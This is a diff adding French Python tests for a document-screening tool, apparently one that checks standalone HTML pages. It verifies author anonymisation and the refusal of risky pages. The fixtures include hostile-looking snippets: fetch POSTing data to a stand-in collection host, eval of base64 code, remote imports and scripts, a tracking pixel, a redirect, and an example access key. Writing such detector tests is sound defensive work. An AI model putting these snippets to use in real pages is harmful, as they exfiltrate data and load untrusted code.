@@ -87,6 +87,59 @@ verifier("pdf : auteur anonymisé", b"Jean Dupont" not in r["octets"])
 verifier("pdf : longueur inchangée", len(r["octets"]) == len(sain_pdf()))
 verifier("pdf : toujours un PDF", r["octets"].startswith(b"%PDF-"))
 
+
+print("Pages HTML (outil autonome)")
+def page(corps="<p>Bonjour</p>", tete="", script=""):
+    return ("<!DOCTYPE html><html lang=\"fr\"><head><meta charset=\"utf-8\"><title>Outil</title>%s</head><body>%s%s</body></html>"
+            % (tete, corps, ("<script>%s</script>" % script) if script else "")).encode("utf-8")
+r = accepte("outil.html", page(script="document.body.dataset.x = String(1 + 1); var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x']));"))
+verifier("html sain : octets inchangés", r["octets"] == page(script="document.body.dataset.x = String(1 + 1); var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x']));"))
+verifier("html : type reconnu", r["type"] == "html")
+accepte("outil.htm", page())
+accepte("espaces de noms.html", page(script="var ns = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';"))
+r = accepte("lien.html", page('<a href="https://exemple.org/aide">aide</a>'))
+verifier("html : lien externe signalé sans refus", any("lien" in x for x in r["alertes"]), r["alertes"])
+r = accepte("auteur.html", page(tete='<meta name="author" content="Jean Dupont">'))
+verifier("html : meta auteur anonymisée", b"Jean Dupont" not in r["octets"] and b"[personne]" in r["octets"], r["octets"][:200])
+r = accepte("auteur2.html", page(tete='<meta content="Jean Dupont" name="author">'))
+verifier("html : meta auteur (ordre inverse) anonymisée", b"Jean Dupont" not in r["octets"], r["octets"][:200])
+for nom, p, mot in [
+    ("fetch.html", page(script="fetch('https://x.example/collecte', {method:'POST', body: d})"), "fetch"),
+    ("xhr.html", page(script="var x = new XMLHttpRequest(); x.open('GET','a')"), "XMLHttpRequest"),
+    ("ws.html", page(script="new WebSocket('wss://x.example')"), "réseau"),
+    ("beacon.html", page(script="navigator.sendBeacon('/x', d)"), "sendBeacon"),
+    ("eval.html", page(script="eval(atob('YWxlcnQoMSk='))"), "eval"),
+    ("func.html", page(script="var f = new Function('return 1')"), "new Function"),
+    ("import.html", page(script="import('https://x.example/m.js')"), "import"),
+    ("worker.html", page(script="new Worker('w.js')"), "Worker"),
+    ("write.html", page(script="document.write('<script src=x></script>')"), "document.write"),
+    ("script-distant.html", page('<script src="https://cdn.example/lib.js"></script>'), "ressource distante"),
+    ("script-sans-schema.html", page('<script src="//cdn.example/lib.js"></script>'), "ressource distante"),
+    ("css-distant.html", page(tete='<link rel="stylesheet" href="https://cdn.example/s.css">'), "ressource distante"),
+    ("image-distante.html", page('<img src="http://pixel.example/p.gif">'), "ressource distante"),
+    ("import-css.html", page(tete='<style>@import url("https://x.example/f.css");</style>'), "ressource distante"),
+    ("url-css.html", page(tete='<style>body{background:url(//x.example/a.png)}</style>'), "ressource distante"),
+    ("iframe.html", page('<iframe src="about:blank"></iframe>'), "iframe"),
+    ("embed.html", page('<object data="x.swf"></object>'), "iframe"),
+    ("base.html", page(tete='<base href="/">'), "balise base"),
+    ("refresh.html", page(tete='<meta http-equiv="refresh" content="0;url=https://x.example">'), "redirection"),
+    ("form.html", page('<form action="https://x.example/collecte"><input name=a></form>'), "formulaire"),
+    ("onclick.html", page('<button onclick="fetch(\'https://x.example\')">ok</button>'), "fetch"),
+    ("marquage.html", page('<p>DIFFUSION RESTREINTE</p>'), "mention de protection"),
+    ("cle.html", page(script="var k = 'AKIAIOSFODNN7EXAMPLE';"), "clé"),
+    ("nul.html", b"<!DOCTYPE html><html>\x00</html>", "octets nuls"),
+    ("pas-html.html", "Juste du texte, pas une page.".encode(), "pas une page HTML"),
+    ("latin1.html", "<!DOCTYPE html><html><body>é</body></html>".encode("latin-1"), "UTF-8"),
+]:
+    refuse(nom, p, mot)
+r = accepte("alertes.html", page(script="var u = atob('aGVsbG8='); window.open('about:blank');"))
+verifier("html : atob et window.open signalés sans refus", len(r["alertes"]) >= 2, r["alertes"])
+r = accepte("relatif.html", page('<script src="lib.js"></script>'))
+verifier("html : fichier voisin signalé", any("voisin" in x for x in r["alertes"]), r["alertes"])
+verifier("html : contrôles décrits", "aucun appel réseau" in " ".join(A.controles_acceptes("html")))
+lot = A.analyser_lot([("outil.html", page()), ("note.docx", sain_docx())])
+verifier("lot mixte html + docx accepté", not lot["refus"], lot["refus"])
+
 print("Formats et types")
 refuse("vieux.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"0" * 50, "ancien format")
 refuse("vieux.xls", b"x", "ancien format")
